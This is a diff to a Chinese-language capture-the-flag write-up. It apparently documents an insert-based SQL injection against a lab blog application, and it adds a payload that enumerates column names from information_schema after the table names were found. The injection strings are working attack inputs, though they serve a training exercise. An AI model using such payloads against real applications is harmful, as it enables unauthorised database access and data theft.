@@ -1060,8 +1060,14 @@ insert into article(title,author,description,content,dateline) values('114514' a
 ```
 去管理文章的页面点击修改我们刚发布的文章，可以看到其回显了数据库名以及用户名：
 ![[Pasted image 20240329124936.png]]
-接下来爆表名 为article,hazel
+爆表名 为article,hazel
 ```
 10086',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'10086','10086','1919810')#
 ```
 ![[Pasted image 20240329125252.png]]
+爆字段名 为 id,flag_is_here
+```
+10086',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="hazel"),'10086','10086','1919810')#
+```
+![[Pasted image 20240329125514.png]]
+dump
